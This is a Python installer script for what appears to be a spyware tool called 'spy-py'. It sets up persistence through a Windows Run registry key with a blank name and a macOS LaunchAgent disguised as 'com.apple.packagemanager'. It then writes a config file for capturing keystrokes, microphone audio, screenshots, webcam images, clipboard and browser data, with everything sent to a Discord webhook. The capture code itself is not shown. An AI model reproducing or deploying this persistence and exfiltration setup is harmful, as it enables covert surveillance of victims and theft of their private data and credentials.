import sys
import subprocess
import os
import platform

try:
    import plistlib
except ImportError:
    pass

try:
    import winreg
except ImportError:
    pass

def install_requirements():
    with open('requirements.txt', 'r') as f:
        requirements = f.read().splitlines()
    for requirement in requirements:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', requirement])


def add_to_startup():
    main_file_path = os.path.join(os.getcwd(), "main.py")
    log_file_path = os.path.join(os.getcwd(), "logfile.log")
    python_interpreter_path = sys.executable
    if platform.system() == "Windows":
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE,
        )
        winreg.SetValueEx(
            key, " ", 0, winreg.REG_SZ, f"{python_interpreter_path} {main_file_path}"
        )
        winreg.CloseKey(key)
    elif platform.system() == "Darwin":
        plist = dict(
            Label="com.apple.packagemanager",
            ProgramArguments=[python_interpreter_path, main_file_path],
            RunAtLoad=True,
            StandardOutPath=log_file_path,
            StandardErrorPath=log_file_path,
        )
        with open(
            os.path.expanduser("~/Library/LaunchAgents/com.apple.packagemanager.plist"),
            "wb",
        ) as f:
            plistlib.dump(plist, f)


def main():
    add_to_startup()

    config_values = {
        "LOG_DIRECTORY_PATH": input(
            "Enter the log directory path (hit enter for default path): "
        ),
        "LOG_ENTRIES_BEFORE_SEND": input(
            "Enter the number of log entries before send (hit enter for default value 10000): "
        ),
        "DISCORD_WEBHOOK_URL": input(
            "Enter the Discord webhook URL (hit enter for default value): "
        ),
        "MAX_INPUT_EVENTS_BEFORE_SEND": input(
            "Enter the maximum number of input events before send (hit enter for default value 100): "
        ),
        "MICROPHONE_RECORD_DURATION_SEC": input(
            "Enter the microphone record duration in seconds (hit enter for default value 60): "
        ),
        "MICROPHONE_RECORDINGS_BEFORE_SEND": input(
            "Enter the number of microphone recordings before send (hit enter for default value 1): "
        ),
        "SCREENSHOT_INTERVAL_SEC": input(
            "Enter the screenshot interval in seconds (hit enter for default value 60): "
        ),
        "SCREENSHOTS_BEFORE_SEND": input(
            "Enter the number of screenshots before send (hit enter for default value 1): "
        ),
        "WEBCAM_CAPTURE_INTERVAL_SEC": input(
            "Enter the webcam capture interval in seconds (hit enter for default value 60): "
        ),
        "WEBCAM_PICTURES_BEFORE_SEND": input(
            "Enter the number of webcam pictures before send (hit enter for default value 1): "
        ),
        "CLIPBOARD_LOG_INTERVAL_SEC": input(
            "Enter the clipboard log interval in seconds (hit enter for default value 500): "
        ),
        "CLIPBOARD_EVENTS_BEFORE_SEND": input(
            "Enter the number of clipboard events before send (hit enter for default value 1): "
        ),
        "BROWSER_LOG_INTERVAL_SEC": input(
            "Enter the browser log interval in seconds (hit enter for default value 20000): "
        ),
        "BROWSER_LOGS_BEFORE_SEND": input(
            "Enter the number of browser logs before send (hit enter for default value 1): "
        ),
    }

    default_values = {
        "LOG_DIRECTORY_PATH": 'os.path.join(tempfile.gettempdir(), "logs")',
        "LOG_ENTRIES_BEFORE_SEND": "10000",
        "DISCORD_WEBHOOK_URL": '""',
        "MAX_INPUT_EVENTS_BEFORE_SEND": "100",
        "MICROPHONE_RECORD_DURATION_SEC": "60",
        "MICROPHONE_RECORDINGS_BEFORE_SEND": "1",
        "SCREENSHOT_INTERVAL_SEC": "60",
        "SCREENSHOTS_BEFORE_SEND": "1",
        "WEBCAM_CAPTURE_INTERVAL_SEC": "60",
        "WEBCAM_PICTURES_BEFORE_SEND": "1",
        "CLIPBOARD_LOG_INTERVAL_SEC": "500",
        "CLIPBOARD_EVENTS_BEFORE_SEND": "1",
        "BROWSER_LOG_INTERVAL_SEC": "20000",
        "BROWSER_LOGS_BEFORE_SEND": "1",
    }

    with open("config.py", "w") as configfile:
        configfile.write("import os\nimport tempfile\n\n")
        for key, value in config_values.items():
            if value == "":
                configfile.write(f"{key} = {default_values[key]}\n")
            else:
                configfile.write(f"{key} = {value}\n")

        configfile.write(
            'DISCORD_WEBHOOK_AVATAR_URL = "https://upload.wikimedia.org/wikipedia/commons/thumb/0/06/Skull_and_Crossbones.svg/510px-Skull_and_Crossbones.svg.png?20190922182140"\n'
        )
        configfile.write('DISCORD_WEBHOOK_USERNAME = "spy-py"\n')


if __name__ == "__main__":
    main()
